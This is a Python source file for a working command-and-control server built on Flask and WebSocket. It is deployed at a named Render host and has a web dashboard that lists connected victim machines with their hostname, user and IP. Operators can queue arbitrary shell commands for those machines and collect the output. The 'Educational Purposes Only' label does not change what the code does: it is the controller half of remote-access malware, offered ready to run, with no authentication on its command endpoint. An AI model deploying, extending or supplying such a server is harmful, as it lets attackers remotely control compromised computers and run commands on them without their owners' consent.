#!/usr/bin/env python3
"""
ENHANCED C2 SERVER - FLASK + WEBSOCKET
Works on Render: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
import hashlib
import time
import threading
import os
import json
from datetime import datetime
from collections import defaultdict
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2-secret-key-change-this-in-production-12345'
socketio = SocketIO(app, cors_allowed_origins="*", logger=False, engineio_logger=False)

# Data storage
clients = {}  # client_id -> client_data
command_queue = defaultdict(list)  # client_id -> [commands]
client_lock = threading.Lock()
online_sockets = {}  # client_id -> socket_id

# HTML dashboard
HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; background: rgba(255, 255, 255, 0.95); border-radius: 15px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); overflow: hidden; }
        .header { background: linear-gradient(135deg, #2d3748 0%, #4a5568 100%); color: white; padding: 25px 30px; text-align: center; border-bottom: 3px solid #4299e1; }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .header p { opacity: 0.8; font-size: 14px; }
        .content { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 30px; }
        @media (max-width: 768px) { .content { grid-template-columns: 1fr; } }
        .panel { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
        .panel h2 { color: #2d3748; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #4299e1; }
        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }
        .stat-box { background: #f7fafc; border-radius: 8px; padding: 15px; text-align: center; border: 1px solid #e2e8f0; }
        .stat-number { font-size: 32px; font-weight: bold; color: #4299e1; display: block; }
        .stat-label { font-size: 14px; color: #718096; margin-top: 5px; }
        .client-item { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 15px; margin-bottom: 10px; transition: all 0.3s; }
        .client-item:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-color: #4299e1; }
        .client-item.online { border-left: 4px solid #48bb78; }
        .client-item.offline { border-left: 4px solid #f56565; opacity: 0.7; }
        .client-id { font-family: 'Courier New', monospace; font-weight: bold; color: #2d3748; }
        .client-info { font-size: 14px; color: #4a5568; margin-top: 8px; }
        .endpoint { background: #edf2f7; padding: 10px; border-radius: 6px; margin: 10px 0; font-family: 'Courier New', monospace; font-size: 14px; }
        .status-online { color: #48bb78; font-weight: bold; }
        .status-offline { color: #f56565; font-weight: bold; }
        .btn { background: #4299e1; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.3s; }
        .btn:hover { background: #3182ce; }
        .form-group { margin: 15px 0; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #4a5568; }
        .form-group input, .form-group textarea { width: 100%; padding: 10px; border: 2px solid #e2e8f0; border-radius: 6px; font-size: 14px; }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #4299e1; }
        .logs { background: #1a202c; color: #cbd5e0; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
    </style>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛰️ C2 Command & Control Server</h1>
            <p>Educational Purposes Only | Server: c2-server-zz0i.onrender.com</p>
        </div>
        
        <div class="content">
            <div class="panel">
                <h2>📊 Server Statistics</h2>
                <div class="stats-grid">
                    <div class="stat-box">
                        <span class="stat-number" id="totalClients">0</span>
                        <span class="stat-label">Total Clients</span>
                    </div>
                    <div class="stat-box">
                        <span class="stat-number" id="onlineClients">0</span>
                        <span class="stat-label">Online Now</span>
                    </div>
                    <div class="stat-box">
                        <span class="stat-number" id="queuedCommands">0</span>
                        <span class="stat-label">Queued Commands</span>
                    </div>
                    <div class="stat-box">
                        <span class="stat-number" id="serverUptime">0s</span>
                        <span class="stat-label">Uptime</span>
                    </div>
                </div>
                
                <h2>🔗 Connection Endpoints</h2>
                <div class="endpoint">WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/</div>
                <div class="endpoint">API: https://c2-server-zz0i.onrender.com/command</div>
                <div class="endpoint">Health: https://c2-server-zz0i.onrender.com/health</div>
                
                <h2>📝 Send Command</h2>
                <div class="form-group">
                    <label for="clientId">Client ID:</label>
                    <input type="text" id="clientId" placeholder="Enter client ID">
                </div>
                <div class="form-group">
                    <label for="command">Command:</label>
                    <input type="text" id="command" placeholder="Enter command (e.g., whoami)">
                </div>
                <button class="btn" onclick="sendCommand()">🚀 Send Command</button>
            </div>
            
            <div class="panel">
                <h2>🖥️ Connected Clients</h2>
                <div id="clientList">
                    <p style="text-align: center; color: #a0aec0; padding: 40px;">No clients connected yet</p>
                </div>
                
                <h2>📋 Server Logs</h2>
                <div class="logs" id="serverLogs">
[System] Server initialized
[System] Waiting for client connections...
                </div>
            </div>
        </div>
    </div>
    
    <script>
        const socket = io();
        let startTime = Date.now();
        
        // Update uptime
        setInterval(() => {
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('serverUptime').textContent = uptime + 's';
        }, 1000);
        
        // Socket events
        socket.on('connect', () => {
            addLog('[WebSocket] Connected to server');
        });
        
        socket.on('client_connected', (data) => {
            addLog(`[Client] ${data.client_id} connected - ${data.hostname}`);
            updateClientList();
        });
        
        socket.on('client_disconnected', (data) => {
            addLog(`[Client] ${data.client_id} disconnected`);
            updateClientList();
        });
        
        socket.on('command_executed', (data) => {
            addLog(`[Command] ${data.client_id}: ${data.command}`);
        });
        
        // Update client list
        function updateClientList() {
            fetch('/clients')
                .then(r => r.json())
                .then(clients => {
                    const clientList = document.getElementById('clientList');
                    if (clients.length === 0) {
                        clientList.innerHTML = '<p style="text-align: center; color: #a0aec0; padding: 40px;">No clients connected yet</p>';
                        return;
                    }
                    
                    let html = '';
                    clients.forEach(client => {
                        const statusClass = client.online ? 'online' : 'offline';
                        const statusText = client.online ? '🟢 ONLINE' : '🔴 OFFLINE';
                        const statusColor = client.online ? 'status-online' : 'status-offline';
                        
                        html += `
                            <div class="client-item ${statusClass}">
                                <div class="client-id">${client.id}</div>
                                <div class="client-info">
                                    <strong>${client.hostname}</strong> | ${client.os}<br>
                                    User: ${client.username} | IP: ${client.ip}<br>
                                    Status: <span class="${statusColor}">${statusText}</span><br>
                                    Last seen: ${formatTime(client.last_seen)}
                                </div>
                            </div>
                        `;
                    });
                    
                    clientList.innerHTML = html;
                    
                    // Update stats
                    document.getElementById('totalClients').textContent = clients.length;
                    document.getElementById('onlineClients').textContent = clients.filter(c => c.online).length;
                    document.getElementById('queuedCommands').textContent = clients.reduce((sum, c) => sum + c.commands_pending, 0);
                });
        }
        
        // Send command
        function sendCommand() {
            const clientId = document.getElementById('clientId').value;
            const command = document.getElementById('command').value;
            
            if (!clientId || !command) {
                alert('Please enter both client ID and command');
                return;
            }
            
            fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: command})
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'queued') {
                    addLog(`[Command] Queued for ${clientId}: ${command}`);
                    document.getElementById('command').value = '';
                    updateClientList();
                } else {
                    addLog(`[Error] ${data.error}`);
                }
            });
        }
        
        // Add log
        function addLog(message) {
            const logs = document.getElementById('serverLogs');
            const time = new Date().toLocaleTimeString();
            logs.innerHTML = `[${time}] ${message}\n${logs.innerHTML}`;
        }
        
        // Format time
        function formatTime(timestamp) {
            return new Date(timestamp * 1000).toLocaleTimeString();
        }
        
        // Initial load
        updateClientList();
        setInterval(updateClientList, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve dashboard"""
    return render_template_string(HTML_DASHBOARD)

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    with client_lock:
        online = sum(1 for c in clients.values() if c.get('online', False))
        return jsonify({
            'status': 'online',
            'clients_total': len(clients),
            'clients_online': online,
            'queued_commands': sum(len(q) for q in command_queue.values()),
            'timestamp': time.time(),
            'server': 'c2-server-zz0i.onrender.com'
        })

@app.route('/clients')
def get_clients():
    """Get all clients"""
    with client_lock:
        clients_list = []
        for client_id, client in clients.items():
            clients_list.append({
                'id': client_id,
                'online': client.get('online', False),
                'hostname': client.get('hostname', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'last_seen': client.get('last_seen', 0),
                'first_seen': client.get('first_seen', 0),
                'commands_pending': len(command_queue.get(client_id, []))
            })
        return jsonify(clients_list)

@app.route('/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id:
            return jsonify({'error': 'Missing client_id'}), 400
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        with client_lock:
            # Create command
            cmd_id = f"cmd_{int(time.time())}_{hashlib.md5(command.encode()).hexdigest()[:6]}"
            command_data = {
                'id': cmd_id,
                'command': command,
                'timestamp': time.time(),
                'status': 'pending'
            }
            
            # Add to queue
            command_queue[client_id].append(command_data)
            
            # If client is online, notify via WebSocket
            if client_id in online_sockets:
                socketio.emit('command', command_data, room=online_sockets[client_id])
                logger.info(f"Command sent immediately to {client_id}: {command[:50]}...")
            else:
                logger.info(f"Command queued for offline client {client_id}: {command[:50]}...")
            
            return jsonify({
                'status': 'queued',
                'command_id': cmd_id,
                'client_id': client_id
            })
            
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 400

@socketio.on('connect')
def handle_connect():
    """Handle new WebSocket connection"""
    logger.info(f"New WebSocket connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnect"""
    with client_lock:
        # Find which client disconnected
        for client_id, socket_id in list(online_sockets.items()):
            if socket_id == request.sid:
                if client_id in clients:
                    clients[client_id]['online'] = False
                    clients[client_id]['last_seen'] = time.time()
                del online_sockets[client_id]
                logger.info(f"Client disconnected: {client_id}")
                socketio.emit('client_disconnected', {'client_id': client_id})
                break

@socketio.on('register')
def handle_register(data):
    """Client registers with system info"""
    try:
        client_ip = request.remote_addr
        
        # Generate client ID if not provided
        if 'id' in data:
            client_id = data['id']
        else:
            unique = f"{data.get('hostname', '')}{data.get('os', '')}{data.get('username', '')}"
            client_id = hashlib.md5(unique.encode()).hexdigest()[:12]
        
        with client_lock:
            # Store/update client info
            if client_id not in clients:
                clients[client_id] = {
                    'hostname': data.get('hostname', 'Unknown'),
                    'os': data.get('os', 'Unknown'),
                    'username': data.get('username', 'Unknown'),
                    'ip': client_ip,
                    'first_seen': time.time(),
                    'last_seen': time.time(),
                    'online': True
                }
            else:
                # Update existing client
                clients[client_id].update({
                    'hostname': data.get('hostname', clients[client_id].get('hostname', 'Unknown')),
                    'os': data.get('os', clients[client_id].get('os', 'Unknown')),
                    'username': data.get('username', clients[client_id].get('username', 'Unknown')),
                    'last_seen': time.time(),
                    'online': True
                })
            
            # Map socket to client
            online_sockets[client_id] = request.sid
            join_room(client_id)
            
            logger.info(f"Client registered: {client_id} - {data.get('hostname')}")
            
            # Send welcome
            emit('welcome', {
                'client_id': client_id,
                'message': 'Registered with C2 server',
                'timestamp': time.time()
            })
            
            # Notify dashboard
            socketio.emit('client_connected', {
                'client_id': client_id,
                'hostname': data.get('hostname', 'Unknown')
            })
            
            # Send any queued commands
            if client_id in command_queue and command_queue[client_id]:
                for cmd in command_queue[client_id]:
                    emit('command', cmd)
                command_queue[client_id] = []
                
    except Exception as e:
        logger.error(f"Registration error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    """Handle command response from client"""
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    
    logger.info(f"Command response from {client_id}: {command_id}")
    
    # Limit log output
    if len(output) > 100:
        logger.info(f"Output (first 100 chars): {output[:100]}...")
    else:
        logger.info(f"Output: {output}")
    
    # Notify dashboard
    socketio.emit('command_executed', {
        'client_id': client_id,
        'command_id': command_id,
        'output_preview': output[:100] + ('...' if len(output) > 100 else '')
    })

def cleanup_stale_clients():
    """Periodically cleanup stale clients"""
    while True:
        time.sleep(60)  # Every minute
        
        with client_lock:
            current_time = time.time()
            stale = []
            
            for client_id, client in list(clients.items()):
                if current_time - client.get('last_seen', 0) > 300:  # 5 minutes
                    stale.append(client_id)
            
            for client_id in stale:
                if client_id in clients:
                    del clients[client_id]
                if client_id in online_sockets:
                    del online_sockets[client_id]
                if client_id in command_queue:
                    del command_queue[client_id]
                
                logger.info(f"Cleaned up stale client: {client_id}")

def print_banner():
    """Print server banner"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║           ENHANCED C2 SERVER                     ║
    ║      https://c2-server-zz0i.onrender.com          ║
    ║        Educational Purposes Only                 ║
    ╚══════════════════════════════════════════════════╝
    """)
    print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
    print("[*] WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/")
    print("[*] Dashboard: https://c2-server-zz0i.onrender.com")
    print("[*] API: https://c2-server-zz0i.onrender.com/command")
    print("[*] Press Ctrl+C to stop\n")

if __name__ == '__main__':
    print_banner()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_stale_clients, daemon=True)
    cleanup_thread.start()
    
    # Run server
    port = int(os.environ.get('PORT', 10000))
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False,
        allow_unsafe_werkzeug=True
    )
